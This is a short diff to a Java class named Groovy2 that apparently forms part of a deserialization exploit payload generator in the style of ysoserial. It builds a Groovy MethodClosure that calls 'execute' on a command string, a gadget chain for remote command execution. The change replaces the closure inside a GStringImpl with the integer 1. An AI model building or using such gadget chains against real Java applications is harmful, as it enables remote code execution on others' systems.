@@ -17,7 +17,7 @@ public class Groovy2 implements ObjectPayload<Object> {
         MethodClosure  execute= (MethodClosure) Reflections.createWithoutConstructor("org.codehaus.groovy.runtime.MethodClosure");
         Reflections.setFieldValue(execute,"owner",command);
         Reflections.setFieldValue(execute,"method","execute");
-        GStringImpl gString = new GStringImpl(new Object[]{execute},new String[]{"start"});
+        GStringImpl gString = new GStringImpl(new Object[]{1},new String[]{"start"});
         try {
             Reflections.setFieldValue(execute,"maximumNumberOfParameters",0);
             Reflections.setFieldValue(execute,"ALLOW_RESOLVE",true);
